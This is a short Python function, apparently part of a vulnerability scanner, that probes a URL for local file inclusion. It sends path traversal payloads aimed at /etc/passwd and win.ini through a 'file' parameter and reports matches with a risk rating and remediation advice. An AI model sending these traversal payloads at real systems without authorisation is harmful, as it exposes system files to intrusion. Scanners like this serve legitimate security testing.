import requests
from colorama import Fore

def check_lfi(url):
    print(Fore.CYAN + "[*] Checking for LFI...")
    results = []
    payloads = ["../../../../etc/passwd", "../windows/win.ini"]

    for p in payloads:
        try:
            test_url = f"{url}?file={p}"
            r = requests.get(test_url, timeout=5)
            if "root:x:" in r.text or "[extensions]" in r.text:
                print(Fore.RED + f"[!] LFI Found: {test_url}")
                results.append({
                    "vulnerability": "Local File Inclusion",
                    "parameter": "file",
                    "payload": p,
                    "risk": "High",
                    "remediation": "Use whitelisting for file paths."
                })
        except:
            pass

    return results
